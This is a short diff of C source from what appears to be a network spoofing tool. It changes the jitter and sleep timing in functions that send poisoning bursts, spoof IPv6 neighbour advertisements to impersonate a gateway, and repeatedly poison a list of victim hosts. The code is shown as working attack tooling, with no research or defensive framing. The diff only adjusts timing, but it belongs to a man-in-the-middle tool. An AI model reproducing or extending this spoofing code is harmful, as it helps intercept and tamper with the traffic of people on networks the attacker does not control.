@@ -95,7 +95,7 @@ void execute_poison_burst(void) {
                         g_poison_gateway_ipv6_ll);
     }
 
-    usleep(1000 + (rand() % 4000)); // 1-5ms jitter (#7)
+    usleep(5000 + (rand() % 16000)); // 5-20ms jitter (#7)
   }
 }
 
@@ -251,9 +251,9 @@ void start_wide_poisoning(unsigned char *gateway_ip, unsigned char *gateway_mac,
       send_ndp_na_spoof(sockfd, all_nodes_mac, my_mac, gateway_ipv6_ll);
     }
 
-    int sleep_ms = 100 + (rand() % 200); // 100-300ms randomized (#7)
-    log_printf("Wide-mode cycle complete. Sleeping %dms...\n", sleep_ms);
-    usleep(sleep_ms * 1000);
+    int sleep_sec = 1 + (rand() % 3); // 1-3s randomized (#7)
+    log_printf("Wide-mode cycle complete. Sleeping %ds...\n", sleep_sec);
+    sleep(sleep_sec);
   }
 
   free(my_mac);
@@ -454,8 +454,8 @@ void start_poisoning(struct Victim *victims, int victim_count,
     // Add small jitter to interval (#7)
     float jitter = ((rand() % 201) - 100) / 1000.0f; // ±0.1s
     float sleep_time = interval + jitter;
-    if (sleep_time < 0.05f) sleep_time = 0.05f;
-    log_printf("Poison sent. Sleeping %.2fs...\n", sleep_time);
+    if (sleep_time < 0.2f) sleep_time = 0.2f;
+    log_printf("Poison sent. Sleeping %.1fs...\n", sleep_time);
     usleep((useconds_t)(sleep_time * 1000000));
   }
 
